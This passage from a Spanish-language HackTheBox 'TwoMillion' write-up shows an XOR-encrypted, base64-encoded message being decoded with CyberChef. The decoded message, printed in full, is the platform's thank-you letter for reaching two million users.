{"encryption": "xor", "encrpytion_key": "HackTheBox", "encoding": "base64", "data": "DAQCGXQgBCEELCAEIQQsSCYtAhU9DwofLURvSDgdaAARDnQcDTAGFCQEB0sgB0UjARYnFA0IMUgEYgIXJQQNHzsdFmICESQEEB87BgBiBhZoDhYZdAIKNx0WLRhDHzsPADYHHTpPQzw9HA1iBhUlBA0YMUgPLRZYKQ8HSzMaBDYGDD0FBkd0HwBiDB0kBAEZNRwAYhsQLUECCDwBADQKFS0PF0s7DkUwChkrCQoFM0hXYgIRJA0KBDpIFycCGToKAgk4DUU3HB06EkJLAAAMMU8RJgIRDjABBy4KWC4EAh90Hwo3AxxoDwwfdAAENApYKgQGBXQYCjEcESoNBksjAREqAA08QQYKNwBFIwEcaAQVDiYRRS0BHWgOBUstBxBsZXIOEwwGdBwNJ08OLRMaSzYNAisBFiEPBEd0IAQhBCwgBCEELEgNIxxYKgQGBXQKECsDDGgUEwQ6SBEqClgqBA8CMQ5FNgcZPEEIBTsfCScLHy1BEAM1GgwsCFRoAgwHOAkHLR0ZPAgMBXhIBCwLWCAADQ8nRQosTx0wEQYZPQ0LIQpYKRMGSzIdCyYOFS0PFwo4SBEtTwgtExAEOgkJYg4WLEETGTsOADEcEScPAgd0DxctGAwgT0M/Ow8ANgcdOk1DHDFIDSMZHWgHDBggDRcnC1gpD0MOOh4MMAAWJQQNH3QfDScdHWgIDQU7HgQ2BhcmQRcDJgETJxxYKQ8HSycDDC4DC2gAEQ50AAosChxmQSYKNwBFIQcZJA0GBTMNRSEAFTgNBh8xDEliChkrCUMGNQsNKwEdaAIMBSUdADAKHGRBAgUwSAA0CgoxQRAAPQQJYgMdKRMNDjBIDSMcWCsODR8mAQc3Gx0sQRcEdBwNJ08bJw0PDjccDDQKWCEPFw44BAwlChYrBEMfPAkRYgkNLQ0QSyAADDFPDiEDEQo6HEUhABUlFA0CIBFLSGUsJ0EGCjcARSMBHGgEFQ4mEUUvChUqBBFLOw5FNgcdaCkCCD88DSctFzBBAAQ5BRAsBgwxTUMfPAkLKU8BJxRDDTsaRSAKESYGQwp0GAQwG1gnB0MfPAEWYgYWKxMGDz0KCSdPEicUEQUxEUtiNhc9E0MIOwYRMAYaPRUKBDobRSoODi1BEAM1GAAmTwwgBEMdMRocYgkZKhMKCHQHA2IADTpBEwc1HAMtHRVoAA0PdAELMR8ROgQHSyEbRTYAWCsODR89BhAjAxQxQQoFOgcTIxsdaAAND3QNEy0DDi1PQzwxSAQwClghDA4OOhsALhZYOBMMHjBICiRPDyAAF0sjDUUqDg4tQQIINwcIMgMROwkGD3QcCiUKDCAEEUd0CQsmTw8tQQYKMw0XLhZYKQ8XAjcBFSMbHWgVCw50Cwo3AQwkBBAYdAUMLgoLPA4NDidIHCcbWDwOQwg7BQBsZXIABBEOcxtFNgBYPAkGSzoNHTZPGyAAEx8xGkliGBAtEwZLIw1FNQYUJEEABDocDCwaHWgVDEskHRYqTwwgBEMJOx0LJg4KIQQQSzsORSEWGi0TEA43HRcrGwFkQQoFJxgMMApYPAkGSzoNHTZPHy0PBhk1HAwtAVgnB0MOIAAMIQ4UaAkCCD8NFzFDWCkPB0s3GgAjGx1oAEMcOxoJJk8PIAQRDnQDCy0YFC0FBA50ARZiDhsrBBAYPQoJJ08MJ0ECBzhGb0g4ETwJQw8xDRUnHAxoBhEKIAERNwsdZGtpPzwNRQoOGyM1Cw4WBx1iOx0pDA=="} 
```

Hemos obtenido como resultado una `cadena` en `base64` `encriptada` con `xor` cuya `clave` de `encriptación` es `HackTheBox`, para desencriptar el mensaje vamos a usar [https://gchq.github.io/CyberChef/](https://gchq.github.io/CyberChef/)

![](/assets/img/TwoMillion/image_15.png)

El mensaje final es el siguiente

```
Dear HackTheBox Community,

We are thrilled to announce a momentous milestone in our journey together. With immense joy and gratitude, we celebrate the achievement of reaching 2 million remarkable users! This incredible feat would not have been possible without each and every one of you.

From the very beginning, HackTheBox has been built upon the belief that knowledge sharing, collaboration, and hands-on experience are fundamental to personal and professional growth. Together, we have fostered an environment where innovation thrives and skills are honed. Each challenge completed, each machine conquered, and every skill learned has contributed to the collective intelligence that fuels this vibrant community.

To each and every member of the HackTheBox community, thank you for being a part of this incredible journey. Your contributions have shaped the very fabric of our platform and inspired us to continually innovate and evolve. We are immensely proud of what we have accomplished together, and we eagerly anticipate the countless milestones yet to come.

Here's to the next chapter, where we will continue to push the boundaries of cybersecurity, inspire the next generation of ethical hackers, and create a world where knowledge is accessible to all.

With deepest gratitude,

The HackTheBox Team
```
